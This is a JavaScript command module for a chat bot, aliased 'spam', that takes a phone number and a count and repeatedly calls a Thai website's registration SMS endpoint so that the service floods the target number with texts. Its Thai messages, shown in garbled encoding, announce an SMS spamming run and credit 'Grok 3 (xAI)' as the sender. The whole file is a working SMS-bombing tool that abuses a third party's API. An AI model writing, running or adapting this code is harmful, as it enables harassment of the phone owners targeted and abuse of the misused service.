const axios = require('axios');

module.exports = {
  config: {
    name: "sms",
    version: "1.0.0",
    description: "р╕кр╣Ир╕З SMS р╕кр╣Бр╕Ыр╕бр╣Бр╕Ър╕Ър╣Ар╕Чр╕Ю р╣Ж р╣Гр╕Щр╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╣Ар╕Фр╕╡р╕вр╕з",
    usage: "/sms <р╣Ар╕Ър╕нр╕гр╣М 10 р╕лр╕ер╕▒р╕Б> <р╕Ир╕│р╕Щр╕зр╕Щ>",
    aliases: ["sendsms", "spam"],
  },
  run: async ({ api, event, args }) => {
    const { senderID } = event;

    // р╕Хр╕гр╕зр╕Ир╕кр╕нр╕Ър╕Др╕│р╕кр╕▒р╣Ир╕З
    if (args.length < 2) {
      return api.sendMessage(senderID, `
тЬи **р╕Др╕│р╕кр╕▒р╣Ир╕Зр╣Ар╕Чр╕Ю SMS Spam** тЬи
тЭМ р╕гр╕╣р╕Ыр╣Бр╕Ър╕Ър╣Др╕бр╣Ир╕Цр╕╣р╕Бр╕Хр╣Йр╕нр╕З!
ЁЯУЬ р╣Гр╕Кр╣Й: /sms <р╣Ар╕Ър╕нр╕гр╣М 10 р╕лр╕ер╕▒р╕Б> <р╕Ир╕│р╕Щр╕зр╕Щ>
ЁЯТб р╕Хр╕▒р╕зр╕нр╕вр╣Ир╕▓р╕З: /sms 0987456321 3
      `);
    }

    const phone = args[0];
    const count = parseInt(args[1]);
    const startTime = Date.now();

    // р╕Хр╕гр╕зр╕Ир╕кр╕нр╕Ър╕Др╕зр╕▓р╕бр╕Цр╕╣р╕Бр╕Хр╣Йр╕нр╕З
    if (!/^\d{10}$/.test(phone)) {
      return api.sendMessage(senderID, `
тЪая╕П **ERROR DETECTED** тЪая╕П
ЁЯУЮ р╣Ар╕Ър╕нр╕гр╣Мр╣Вр╕Чр╕гр╕Хр╣Йр╕нр╕Зр╣Ар╕Ыр╣Зр╕Щр╕Хр╕▒р╕зр╣Ар╕ер╕В 10 р╕лр╕ер╕▒р╕Бр╣Ар╕Чр╣Ир╕▓р╕Щр╕▒р╣Йр╕Щ!
ЁЯТв р╕Хр╕▒р╕зр╕нр╕вр╣Ир╕▓р╕З: 0987456321
      `);
    }
    if (isNaN(count) || count < 1) {
      return api.sendMessage(senderID, `
тЪая╕П **INVALID INPUT** тЪая╕П
ЁЯФв р╕Ир╕│р╕Щр╕зр╕Щр╕Хр╣Йр╕нр╕Зр╣Ар╕Ыр╣Зр╕Щр╕Хр╕▒р╕зр╣Ар╕ер╕Вр╣Бр╕ер╕░р╕бр╕▓р╕Бр╕Бр╕зр╣Ир╕▓ 0!
      `);
    }
    if (count > 10) {
      return api.sendMessage(senderID, `
ЁЯЪл **LIMIT EXCEEDED** ЁЯЪл
ЁЯФЯ р╕Ир╕│р╕Щр╕зр╕Щр╕гр╕нр╕Ър╕Хр╣Йр╕нр╕Зр╣Др╕бр╣Ир╣Ар╕Бр╕┤р╕Щ 10!
      `);
    }

    const apiUrl = `https://www.dataiku-thai.com/api/reg/sms?account=${phone}`;
    const headers = {
      'Language': 'th-TH',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Encoding': 'gzip, deflate, br',
    };

    try {
      const interval = 60 / count; // р╕зр╕┤р╕Щр╕▓р╕Чр╕╡р╕Хр╣Ир╕нр╕гр╕нр╕Ъ
      let successCount = 0;

      // р╕кр╕гр╣Йр╕▓р╕Зр╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╣Ар╕гр╕┤р╣Ир╕бр╕Хр╣Йр╕Щ
      let message = `
ЁЯФе **р╣Ар╕гр╕┤р╣Ир╕бр╕Бр╕▓р╕гр╕кр╣Бр╕Ыр╕б SMS р╕кр╕╕р╕Фр╣Ар╕Чр╣И** ЁЯФе
ЁЯУЮ р╣Ар╕Ыр╣Йр╕▓р╕лр╕бр╕▓р╕в: ${phone}
ЁЯОп р╕Ир╕│р╕Щр╕зр╕Щ: ${count} р╕гр╕нр╕Ъ
тП▒я╕П р╕гр╕░р╕вр╕░р╕лр╣Ир╕▓р╕З: ${interval.toFixed(2)} р╕зр╕┤р╕Щр╕▓р╕Чр╕╡/р╕гр╕нр╕Ъ
ЁЯС╛ **р╕вр╕┤р╕Зр╣Вр╕Фр╕в**: Grok 3 (xAI)
      `;

      // р╕вр╕┤р╕З SMS р╕Хр╕▓р╕бр╕Ир╕│р╕Щр╕зр╕Щр╕гр╕нр╕Ъ
      for (let i = 0; i < count; i++) {
        try {
          await axios.get(apiUrl, { headers });
          successCount++;
        } catch (roundError) {
          console.error(`тЭМ р╕гр╕нр╕Ър╕Чр╕╡р╣И ${i + 1} р╕ер╣Йр╕бр╣Ар╕лр╕ер╕з: ${roundError.message}`);
        }
        if (i < count - 1) {
          await new Promise(resolve => setTimeout(resolve, interval * 1000));
        }
      }

      // р╕кр╕гр╕╕р╕Ыр╕Ьр╕ер╣Гр╕Щр╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╣Ар╕Фр╕╡р╕вр╕з
      const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
      const summary = `
ЁЯОЙ **р╕Ьр╕ер╕Бр╕▓р╕гр╕кр╣Бр╕Ыр╕б SMS р╕кр╕╕р╕Фр╣Ар╕Ир╣Лр╕З** ЁЯОЙ
ЁЯУЮ р╣Ар╕Ър╕нр╕гр╣М: ${phone}
тЬЕ р╕кр╣Ир╕Зр╕кр╕│р╣Ар╕гр╣Зр╕И: ${successCount}/${count} р╕гр╕нр╕Ъ
тП░ р╣Гр╕Кр╣Йр╣Ар╕зр╕ер╕▓р╕Чр╕▒р╣Йр╕Зр╕лр╕бр╕Ф: ${totalTime} р╕зр╕┤р╕Щр╕▓р╕Чр╕╡
ЁЯТе р╕кр╕Цр╕▓р╕Щр╕░: р╣Ар╕кр╕гр╣Зр╕Ир╕кр╕┤р╣Йр╕Щр╕ар╕▓р╕гр╕Бр╕┤р╕И!
      `;

      // р╕кр╣Ир╕Зр╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╣Ар╕гр╕┤р╣Ир╕бр╕Хр╣Йр╕Щр╣Бр╕ер╕░р╕кр╕гр╕╕р╕Ыр╣Гр╕Щр╕Др╕гр╕▒р╣Йр╕Зр╣Ар╕Фр╕╡р╕вр╕з
      await api.sendMessage(senderID, message + "\n" + summary);
    } catch (error) {
      console.error("тЭМ р╣Ар╕Бр╕┤р╕Фр╕Вр╣Йр╕нр╕Ьр╕┤р╕Фр╕Юр╕ер╕▓р╕Фр╣Гр╕лр╕Нр╣И:", error.message);
      return api.sendMessage(senderID, `
ЁЯТе **SYSTEM FAILURE** ЁЯТе
тЭМ р╣Др╕бр╣Ир╕кр╕▓р╕бр╕▓р╕гр╕Цр╕кр╣Бр╕Ыр╕б SMS р╣Др╕Фр╣Й!
ЁЯУв р╣Ар╕лр╕Хр╕╕р╕Ьр╕е: ${error.message}
тП▓я╕П р╕ер╕нр╕Зр╣Гр╕лр╕бр╣Ир╕ар╕▓р╕вр╕лр╕ер╕▒р╕З!
      `);
    }
  }
};